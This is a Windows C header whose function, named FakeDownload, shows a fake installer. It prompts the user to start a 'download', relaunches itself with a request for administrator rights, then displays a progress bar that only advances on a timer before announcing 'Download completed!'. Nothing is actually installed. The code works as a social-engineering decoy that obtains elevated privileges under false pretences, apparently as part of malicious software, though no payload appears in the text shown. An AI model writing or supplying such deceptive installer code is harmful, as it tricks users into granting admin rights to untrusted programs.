#pragma once
#include <windows.h>
#include <commctrl.h>
#include <stdlib.h>
#include <time.h>
#include <shlobj.h> // Required for IsUserAnAdmin
#pragma comment(lib, "Shell32.lib") // Link with Shell32.lib

#pragma comment(lib, "comctl32.lib")

#define ID_PROGRESS_BAR 101

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hProgressBar;
    static int progress = 0;
    static UINT_PTR timerId;

    switch (uMsg) {
        case WM_CREATE: {
            // Creazione della barra di progresso
            RECT rect;
            GetClientRect(hwnd, &rect);
            int progressBarWidth = 200;
            int progressBarHeight = 15;
            int xPos = (rect.right - progressBarWidth) / 2;
            int yPos = (rect.bottom - progressBarHeight) / 2;

            CreateWindowEx(0, "STATIC", "Installing please wait...",
                           WS_CHILD | WS_VISIBLE | SS_CENTER,
                           xPos, yPos - 20, progressBarWidth, 20,
                           hwnd, NULL, GetModuleHandle(NULL), NULL);

            hProgressBar = CreateWindowEx(0, PROGRESS_CLASS, NULL,
                                          WS_CHILD | WS_VISIBLE,
                                          xPos, yPos, progressBarWidth, progressBarHeight,
                                          hwnd, (HMENU)ID_PROGRESS_BAR, GetModuleHandle(NULL), NULL);

            SendMessage(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
            SendMessage(hProgressBar, PBM_SETSTEP, (WPARAM)1, 0);

            // Imposta un timer per aggiornare la barra di progresso
            timerId = SetTimer(hwnd, 1, 100, NULL);
            break;
        }
        case WM_TIMER: {
            if (progress < 100) {
                progress++;
                SendMessage(hProgressBar, PBM_STEPIT, 0, 0);
            } else {
                KillTimer(hwnd, timerId);
                MessageBox(hwnd, "Download completed!", "Installer", MB_OK | MB_ICONINFORMATION);
                DestroyWindow(hwnd);
            }
            break;
        }
        case WM_DESTROY: {
            PostQuitMessage(0);
            break;
        }
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

void FakeDownload() {

    // Mostra una finestra iniziale per chiedere all'utente di cliccare "Continua"
    if(!IsUserAnAdmin()){
    int response = MessageBox(NULL, "Click 'OK' to start Download.", "Installer", MB_OKCANCEL | MB_ICONQUESTION);
    if (response == IDCANCEL) {
        return; // L'utente ha annullato l'operazione
    }
    }

    // Richiedi privilegi amministrativi
    if (!IsUserAnAdmin()) {
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        ShellExecuteW(NULL, L"runas", modulePath, NULL, NULL, SW_SHOWNORMAL);

        // Attendi che il programma venga riavviato con privilegi amministrativi
        ExitProcess(0); // Termina il processo corrente per consentire il riavvio
    }

    srand((unsigned int)time(NULL));
    int downloadTime = 16 + rand() % 9; // Tempo casuale tra 16 e 24 secondi
    int timerInterval = downloadTime * 10; // Intervallo del timer in millisecondi

    HINSTANCE hInstance = GetModuleHandle(NULL);
    int nCmdShow = SW_SHOWNORMAL;

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "FakeDownloadWindow";

    RegisterClass(&wc);

    HWND hwnd = CreateWindowA("FakeDownloadWindow", "Installer",
                              WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
                              CW_USEDEFAULT, CW_USEDEFAULT, 300, 150,
                              NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        return;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}